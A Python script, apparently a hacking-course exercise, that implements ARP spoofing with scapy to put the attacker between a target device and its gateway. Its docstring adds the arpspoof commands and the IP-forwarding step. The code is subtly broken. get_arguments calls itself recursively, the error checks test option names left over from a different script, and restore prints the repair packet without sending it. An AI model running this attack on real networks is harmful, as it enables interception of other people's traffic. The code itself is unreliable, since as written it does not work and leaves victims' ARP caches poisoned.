"""
A program that functions exactly the same as arpspoof command in Kali Linux. 
It takes target ip address and gateway ip address as command line arguments.

ARP Spoofing: Tell router that I am victim device by sending victim device's 
IP Address, and tell victim device that I am router by sending router's IP
Address.

To become man in the middle, Tell router that I am victim device by sending 
victim device's MAC Address, and tell victim device that I am router by sending 
router's MAC Address.

Kali Linux tool: arpspoof
    e.g. arpspoof -i wlan0 -t [target ip address] [gateway]
         arpspoof -i wlan0 -t [gateway] [target ip address] 
         Run these two commands simultanesouly
         
         # since this computer is not a router, we need to enable port 
         forwarding so this computer is allowed to flow packets
         echo 1 > /proc/sys/net/ipv4/ip_forward

ARP Spoofing is possible:
    1. Clients accept reseponses even if they did not send a request
    2. Clients trsut response without any form of verification.
"""
#!/usr/bin/env python
import optparse
import scapy.all as scapy
import time
import sys  # for Python2


def get_arguments():
    # Get command line arguments
    """
    Get the IP Address of target device and gateway.

    :return: options and arugments of command line arguments
    :rtype: (options, argument)
    """
    parser = optparse.OptionParser()

    # Get the IP Address of target device
    parser.add_option("-t", "--target", dest="target",
                      help="Target IP Address")
    # Get the IP Address of spoof device
    parser.add_option("-g", "--gateway", dest="gateway",
                      help="Gateway IP Address")

    (options, arguments) = get_arguments()

    # Code to handle error
    if not options.interface:
        parser.error(
            "[-] Please specify an IP Address of target device,"
            " use --help for more info.")
    elif not options.new_mac_address:
        parser.error(
            "[-] Please specify a Gateway IP Address"
            ", use --help for more info.")
    return options


def get_mac(ip_address):
    """
    Get the MAC Address of target device.

    :param ip_address: IP Address of target device
    :type ip_address: str
    :return: MAC Address of target device
    :rtype: str 
    """
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # ethernet object
    # final packet
    arp_request_broadcast = broadcast / arp_request

    # use srp function to send arp_request_broadcast packet and receive response
    answered_list = scapy.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """
    ARP spoof device with target_ip from spoof _ip.
    
    :param target_ip: IP Address of target device
    :type target_ip: str
    :param spoof_ip: IP Address of router, i.e. gateway
    :type spoof_ip: str
    """
    target_mac = get_mac(target_ip)
    # set op to 2 since we want arp response not request
    # pdst: ip of target device (use network_scanner.py to find target's ip)
    # hwdst: MAC Address of target device
    # psrc: source field, ip of router
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    """
    Restore the packet when an error occured.
    :param destination_ip: IP Address of target device
    :type destination_ip: str
    :param source_ip: Gateway IP Address
    :type source_ip: str
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    print(packet.show())
    print(packet.summary())


if __name__ == "__main__":
    command_options = get_arguments()
    sent_packets_count = 0
    try:
        while True:
            spoof(command_options.target, command_options.gateway)
            spoof(command_options.gateway, command_options.target)
            sent_packets_count += 2
            # Python2
            print("\r[-] Packets sent: " + str(sent_packets_count)),
            sys.stdout.flush()

            # Python3
            # print("\r[-] Packets sent: " + str(sent_packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[-] Detected CTRl + C ...... Quitting.")
        restore(command_options.target, command_options.gateway)
        restore(command_options.gateway, command_options.target)
